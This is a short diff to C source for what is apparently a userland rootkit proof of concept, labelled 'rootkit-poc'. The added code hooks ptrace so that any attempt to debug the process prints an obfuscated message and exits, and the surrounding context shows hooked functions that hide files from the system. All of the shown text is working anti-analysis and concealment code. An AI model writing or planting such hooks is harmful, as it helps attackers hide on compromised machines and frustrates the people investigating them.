@@ -147,6 +147,19 @@ int is_invisible(const char *path) {
     return 0; // visible
 }
 
+// Hooked ptrace function to exit on debug
+long ptrace(void *request, pid_t pid, void *addr, void *data) {
+    char *anti_debug_msg = strdup(ANTI_DEBUG_MSG);
+
+    xor(anti_debug_msg);
+
+    printf("%s\n", anti_debug_msg);
+
+    cleanup(anti_debug_msg, strlen(anti_debug_msg));
+
+    exit(-1);
+}
+
 // Hooked access function to hide invisible files
 int access(const char *path, int mode) {
     DEBUG("[rootkit-poc]: access hooked\n");
